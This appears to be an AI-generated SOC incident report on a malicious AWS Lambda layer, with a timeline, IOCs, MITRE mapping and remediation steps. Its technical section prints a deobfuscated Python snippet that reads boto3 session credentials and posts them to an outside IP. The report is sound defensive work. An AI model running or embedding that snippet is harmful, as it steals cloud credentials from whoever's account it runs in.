# Investigation: Malicious Lambda Layer Detection

---
**Alert ID**: SOC-2025-0905-001  
**Investigation ID**: sturdy-playful-pineapple  
**Start Time**: 2025-09-05 09:30:00 UTC  
**End Time**: 2025-09-05 10:15:00 UTC  
**Investigator**: Claude Code v4  
**Status**: Complete  
---

## Executive Summary

**Classification**: 🔴 **MALICIOUS**  
**Confidence**: High (85%)  
**Original Severity**: Critical  
**Assessed Severity**: Critical  

**Key Finding**: Lambda layer containing malicious Python package discovered in production AWS account. Layer was used across 15 Lambda functions to establish persistence and credential harvesting capability.

**Immediate Actions Required**:
- [ ] Quarantine all Lambda functions using layer `arn:aws:lambda:us-east-1:123456789012:layer:utils-v2:7`
- [ ] Rotate all IAM credentials accessed by affected functions
- [ ] Review CloudTrail for lateral movement attempts

## Timeline

| Time | Event | Source |
|------|-------|---------|
| 09:15 | Lambda layer created with suspicious name similarity to legitimate layer | CloudTrail |
| 09:18 | Layer attached to 15 production Lambda functions | CloudTrail |
| 09:25 | Unusual outbound network connections detected | VPC Flow Logs |
| 09:27 | Alert triggered on anomalous Lambda layer usage | GuardDuty |

## Investigation Process

### 1. Initial Alert Analysis
**Tool Used**: `scanner_query`  
**Query**: `source_type:aws-guardduty AND finding_type:Trojan:Lambda/MaliciousLayer`
**Findings**: Single GuardDuty finding indicating suspicious Lambda layer with high confidence score

### 2. Layer Content Analysis  
**Tool Used**: `aws_lambda_get_layer`  
**Parameters**: `layer_arn: arn:aws:lambda:us-east-1:123456789012:layer:utils-v2:7`
**Findings**: 
- Layer contains obfuscated Python code
- Base64 encoded strings detected
- Import statements for `boto3`, `requests`, `socket`

### 3. Network Activity Investigation
**Tool Used**: `scanner_query`  
**Query**: `source_type:vpc-flow-logs AND src_account:123456789012 AND time_range:last_2h`
**Findings**:
- 47 outbound connections to 185.234.72.45:443
- Data exfiltration pattern: 2.3MB uploaded
- Connections from Lambda execution IPs

### 4. Impact Assessment
**Tool Used**: `aws_lambda_list_functions`  
**Parameters**: `layer_arn: arn:aws:lambda:us-east-1:123456789012:layer:utils-v2:7`
**Findings**: 15 Lambda functions using malicious layer across 3 different services

## Technical Details

### Malicious Layer Analysis
```python
# Deobfuscated payload excerpt
import base64, boto3, requests

def harvest_creds():
    session = boto3.Session()
    credentials = session.get_credentials()
    payload = {
        'access_key': credentials.access_key,
        'secret_key': credentials.secret_key,
        'session_token': credentials.token
    }
    requests.post('https://185.234.72.45/exfil', json=payload)
```

### Network IOCs
- **C2 Server**: 185.234.72.45:443
- **User-Agent**: `python-requests/2.28.1`
- **Exfil Pattern**: JSON POST requests every 5 minutes

## Threat Assessment

**MITRE ATT&CK Mapping**:
- T1543.003 - Create or Modify System Process: Serverless Execution
- T1078.004 - Valid Accounts: Cloud Accounts  
- T1567.002 - Exfiltration Over Web Service

**Threat Actor Profile**: 
- Sophisticated understanding of AWS Lambda layers
- Focus on credential harvesting for lateral movement
- Well-resourced (dedicated C2 infrastructure)

## Recommendations

### Immediate (0-4 hours)
1. **Quarantine Functions**: Remove malicious layer from all 15 affected Lambda functions
2. **Credential Rotation**: Rotate IAM keys for all roles used by affected functions
3. **Network Blocking**: Block 185.234.72.45 at WAF/firewall level

### Short-term (1-7 days)  
1. **Layer Validation**: Implement Lambda layer integrity checking
2. **Monitoring Enhancement**: Add alerts for unusual layer attachment patterns
3. **Incident Response**: Full forensic analysis of affected systems

### Long-term (1-4 weeks)
1. **Policy Updates**: Require approval workflow for new Lambda layers
2. **Security Training**: Developer education on supply chain attacks
3. **Architecture Review**: Minimize Lambda IAM permissions

## Lessons Learned

1. **Layer Oversight Gap**: No visibility into Lambda layer contents before deployment
2. **Monitoring Blind Spot**: Layer attachment events not adequately monitored  
3. **Rapid Impact**: Single malicious layer affected 15 functions within minutes

---
*Investigation completed by Claude Code. Human review and validation recommended before implementing recommendations.*